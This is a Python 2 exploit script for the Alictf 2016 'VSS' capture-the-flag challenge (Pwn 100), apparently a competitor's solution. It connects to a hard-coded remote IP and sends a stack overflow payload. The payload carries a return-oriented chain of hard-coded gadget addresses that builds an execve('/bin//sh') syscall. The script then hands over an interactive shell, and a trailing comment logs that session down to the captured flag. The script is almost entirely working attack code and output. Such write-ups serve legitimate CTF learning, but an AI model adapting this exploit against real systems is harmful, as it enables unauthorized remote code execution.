#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Alictf 2016 - VSS - Very Secure System (Pwn 100)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import telnetlib
from struct import pack
# --------------------------------------------------------------------------------------------------
def recv_until(st):                             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)

  return ret

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    s = socket.create_connection(('121.40.56.102', 2333)) 
    #s = socket.create_connection(('localhost', 7777))      # connect to server

    print recv_until('Password:')               # eat input

    p  = 'py' + 'AAAAAA'
    p += 'K' * 0x38

    p += pack('<Q', 0x4444444444444444)         # old rbp
    p += pack('<Q', 0x00000000004055B6)         # return to stack-adjustment gadget
    
    '''
        .text:00000000004055B6 48 83 C4 78                       add     rsp, 78h
        .text:00000000004055BA 4C 89 E8                          mov     rax, r13
        .text:00000000004055BD 5B                                pop     rbx
        .text:00000000004055BE 5D                                pop     rbp
        .text:00000000004055BF 41 5C                             pop     r12
        .text:00000000004055C1 41 5D                             pop     r13
        .text:00000000004055C3 41 5E                             pop     r14
        .text:00000000004055C5 41 5F                             pop     r15
        .text:00000000004055C7 C3                                retn
    '''


    p += 'E'*16 + '\x00'*8 + 'X'*0x40           # do some padding first

    p += pack('<Q', 0x0000000000401937)         # pop rsi ; ret
    p += pack('<Q', 0x00000000006c4080)         # @ .data
    p += pack('<Q', 0x000000000046f208)         # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x000000000046b8d1)         # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000401937)         # pop rsi ; ret
    p += pack('<Q', 0x00000000006c4088)         # @ .data + 8
    p += pack('<Q', 0x000000000041bd1f)         # xor rax, rax ; ret
    p += pack('<Q', 0x000000000046b8d1)         # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000401823)         # pop rdi ; ret
    p += pack('<Q', 0x00000000006c4080)         # @ .data
    p += pack('<Q', 0x0000000000401937)         # pop rsi ; ret
    p += pack('<Q', 0x00000000006c4088)         # @ .data + 8
    p += pack('<Q', 0x000000000043ae05)         # pop rdx ; ret
    p += pack('<Q', 0x00000000006c4088)         # @ .data + 8
    p += pack('<Q', 0x000000000041bd1f)         # xor rax, rax ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x000000000045e790)         # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004004b8)         # syscall


    s.send( p )                                 # send payload

    print ' *** Opening Shell *** '
    t = telnetlib.Telnet()                      # try to get a shell
    t.sock = s
    t.interact()
    
    exit(0) 
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/alictf# ./vss_expl.py 
    VSS:Very Secure System
    Password:

     *** Opening Shell *** 
    id
        uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
    ls -l
        total 68
        drwxr-xr-x   2 root root 4096 May 26 21:41 bin
        drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
        drwxr-xr-x   5 root root  360 Jun  3 11:06 dev
        drwxr-xr-x  70 root root 4096 May 31 03:35 etc
        drwxr-xr-x   9 root root 4096 May 31 03:19 home
        drwxr-xr-x  13 root root 4096 May 31 03:18 lib
        drwxr-xr-x   2 root root 4096 May 31 03:18 lib32
        drwxr-xr-x   2 root root 4096 May 26 21:40 lib64
        drwxr-xr-x   2 root root 4096 May 26 21:40 media
        drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
        drwxr-xr-x   2 root root 4096 May 26 21:40 opt
        dr-xr-xr-x 146 root root    0 Jun  3 11:06 proc
        drwx------   2 root root 4096 May 31 03:53 root
        drwxr-xr-x   7 root root 4096 Jun  3 11:06 run
        drwxr-xr-x   2 root root 4096 May 27 14:12 sbin
        drwxr-xr-x   2 root root 4096 May 26 21:40 srv
        dr-xr-xr-x  13 root root    0 Jun  3 11:06 sys
        drwxrwxrwt   2 root root 4096 Jun  4 15:14 tmp
        drwxr-xr-x  14 root root 4096 May 31 03:18 usr
        drwxr-xr-x  19 root root 4096 May 31 03:19 var
    ls -l home
        total 4
        drwxr-x--- 2 root ctf 4096 May 31 03:19 ctf
    ls -l home/ctf
        total 804
        -rwxr----- 1 root ctf     24 May 31 02:49 flag
        -rwxr-x--- 1 root ctf      4 May 31 02:51 pass.enc
        -rwxr-x--- 1 root ctf 812320 May 31 02:13 vss 
    cat /home/ctf/flag
        alictf{n0t_v3ry_secure}
    exit
*** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
